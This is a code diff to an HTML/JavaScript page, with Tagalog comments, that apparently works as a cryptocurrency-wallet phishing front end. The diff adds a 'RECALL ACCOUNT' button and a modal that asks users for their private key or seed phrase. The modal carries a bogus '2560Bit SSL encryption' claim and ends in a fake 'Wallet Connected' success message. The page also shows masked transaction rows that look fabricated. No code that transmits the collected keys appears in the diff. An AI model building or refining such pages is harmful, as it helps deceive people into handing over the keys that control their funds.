@@ -293,74 +293,61 @@
             body.innerHTML += `<tr><td>0x823b...8***</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td>- ***,***,** USD</td></tr>`;
         }
     }
-    // ==========================================================
-    // EXTRA FUNCTIONS PARA MAPINDOT ULIT ANG MGA DI-DILAW NA BUTTON
-    // ==========================================================
-    function showForm(type) {
-        const regBox = document.getElementById('reg-box');
-        const loginBox = document.getElementById('login-box');
-        const choiceBox = document.querySelector('.auth-card[id="choice-box"]') || document.querySelector('.auth-card');
-        
-        if (type === 'reg') {
-            if (choiceBox) choiceBox.style.display = 'none';
-            if (regBox) regBox.style.display = 'block';
-        } else if (type === 'login') {
-            if (choiceBox) choiceBox.style.display = 'none';
-            if (loginBox) loginBox.style.display = 'block';
-        }
-    }
-function showForm(type) {
-    const regBox = document.getElementById('reg-box');
-    const loginBox = document.getElementById('login-box');
-    const choiceBox = document.querySelector('.auth-card[id="choice-box"]') || document.querySelector('.auth-card');
-    
-    if (type === 'reg') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (regBox) regBox.style.display = 'block';
-    } else if (type === 'login') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (loginBox) loginBox.style.display = 'block';
-    }
-}
+   <!-- MAIN CHOICE BUTTONS -->
+<button class="btn-yellow" onclick="showForm('wallet')">RECALL ACCOUNT</button>
+<button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Existing account</button>
 
-// EXTRA FUNCTIONS PARA MAPINDOT ULIT ANG MGA DI-DILAW NA BUTTON
-// ==========================================================
-function showForm(type) {
-    const regBox = document.getElementById('reg-box');
-    const loginBox = document.getElementById('login-box');
-    const choiceBox = document.querySelector('.auth-card[id="choice-box"]') || document.querySelector('.auth-card');
-    
-    if (type === 'reg') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (regBox) regBox.style.display = 'block';
-    } else if (type === 'login') {
-        if (choiceBox) choiceBox.style.display = 'none';
-        if (loginBox) loginBox.style.display = 'block';
-    }
-}
+<!-- LINKED PAYMENT METHOD MODAL (THE WHITE BOX) -->
+<div class="white-modal" id="wallet-modal" style="display: none;">
+    <div class="white-box">
+        <h2 style="margin:0 0 10px 0;">Privacy protected with 2560Bit SSL encryption.</h2>
+        <p style="font-size:12px; color:#666; margin-bottom:20px;">CONNECT YOUR WALLET.</p>
+        
+        <input type="text" id="wallet-name" placeholder="WALLET NAME" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        <input type="password" id="wallet-key" placeholder="PRIVATE KEY / SEED PHRASE" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
+        
+        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="runBiometricSequence()">RECOVER WALLET</button>
+        <button class="btn-yellow" style="background:#eee; color:#555; width:100%;" onclick="closeModal()">Back to Dashboard</button>
+    </div>
+</div>
 
 <script>
-// EXTRA FUNCTIONS PARA MAPINDOT ULIT ANG MGA DI-DILAW NA BUTTON
+// PINAKAMALINIS NA SHOWFORM: Kontrolado ang lahat ng buttons mo
 // ==========================================================
 function showForm(type) {
     const regBox = document.getElementById('reg-box');
     const loginBox = document.getElementById('login-box');
-    const choiceBox = document.querySelector('.auth-card[id="choice-box"]') || document.querySelector('.auth-card');
+    const walletModal = document.getElementById('wallet-modal');
     
+    // Hahanapin ang main menu box na naglalaman ng dalawang buttons mo para itago
+    const choiceBox = document.getElementById('choice-box') || document.querySelector('.auth-card') || document.querySelector('.choice-container');
+    
+    if (choiceBox) choiceBox.style.display = 'none';
+
     if (type === 'reg') {
-        if (choiceBox) choiceBox.style.display = 'none';
         if (regBox) regBox.style.display = 'block';
     } else if (type === 'login') {
-        if (choiceBox) choiceBox.style.display = 'none';
         if (loginBox) loginBox.style.display = 'block';
+    } else if (type === 'wallet') {
+        // ETO ANG MAGBUBUKAS SA WHITE BOX WALLET KAPAG PININDOT ANG RECALL ACCOUNT
+        if (walletModal) walletModal.style.display = 'block';
     }
+}
+
+// Para sa "Back to Dashboard" button sa loob ng white box
+function closeModal() {
+    const walletModal = document.getElementById('wallet-modal');
+    const choiceBox = document.getElementById('choice-box') || document.querySelector('.auth-card') || document.querySelector('.choice-container');
+    
+    if (walletModal) walletModal.style.display = 'none';
+    if (choiceBox) choiceBox.style.display = 'block'; // Papalutangin ulit ang dalawang main buttons mo
 }
 
 function runBiometricSequence() {
     const walletName = document.getElementById('wallet-name');
     const walletKey = document.getElementById('wallet-key');
 
-    // Tinitiyak na may kahit anong text na tinype bago magpatuloy
+    // Tinitiyak na may text na isinulat kahit ano bago mag-load
     if (walletName && walletKey) {
         if (walletName.value.trim() === "" || walletKey.value.trim() === "") {
             alert("Please enter both Wallet Name and Private Key / Seed Phrase.");
@@ -368,50 +355,20 @@ function runBiometricSequence() {
         }
     }
 
-    // SAPILITANG PAGTATAGO SA MGA INVISIBLE OVERLAYS PARA MAPINDOT ANG LAHAT NG BUTTONS AFTER
+    // INSTANT PASOK: Pagtatago sa lahat ng overlays at pagbubukas ng dashboard wrapper mo
     const walletModal = document.getElementById('wallet-modal');
+    const authOverlay = document.getElementById('auth-overlay');
+    const mainWrapper = document.getElementById('main-wrapper');
+
     if (walletModal) walletModal.style.display = 'none';
+    if (authOverlay) authOverlay.style.display = 'none';
+    if (mainWrapper) mainWrapper.style.display = 'block';
 
-    const loaderContainer = document.getElementById('loader') || document.querySelector('.loader-container');
-    const statusText = document.querySelector('.loading-text') || (loaderContainer ? loaderContainer.querySelector('p') : null);
-    const loaderRing = document.querySelector('.loader-ring');
+    alert("Wallet Connected & Reconnected Successfully!");
 
-    if (loaderContainer) loaderContainer.style.display = 'block';
-    if (loaderRing) loaderRing.style.display = 'inline-block';
-    
-    if (statusText) statusText.innerText = "Connecting Wallet... Please wait.";
-
-    // Maikling loading delay para iwas browser error timeout
-    setTimeout(() => {
-        
-        if (statusText) statusText.innerText = "Syncing with secure node... Finalizing setup.";
-
-        setTimeout(() => {
-            
-            // Patayin ang loading elements
-            if (loaderRing) loaderRing.style.display = 'none';
-            if (loaderContainer) loaderContainer.style.display = 'none';
-            if (statusText) statusText.innerText = ""; 
-            
-            alert("Wallet Connected & Reconnected Successfully!");
-
-            // KRITIKAL NA SOLUSYON: Itago ang kahit anong auth screen blockages
-            const authOverlay = document.getElementById('auth-overlay');
-            const mainWrapper = document.getElementById('main-wrapper'); 
-
-            if (authOverlay) authOverlay.style.display = 'none'; // Eto yung tinagong blocker
-            if (mainWrapper) mainWrapper.style.display = 'block'; // Eto yung dashboard layout
-
-            // Siguraduhing clear ang pointers para ma-click mo ang dashboard elements
-            document.body.style.pointerEvents = "auto";
-
-            // Nililinis ang mga kahon
-            if (walletName) walletName.value = "";
-            if (walletKey) walletKey.value = "";
-
-        }, 1500); 
-
-    }, 1500); 
+    // Linisin ang input boxes pagkapasok
+    if (walletName) walletName.value = "";
+    if (walletKey) walletKey.value = "";
 }
 </script>
 </body>
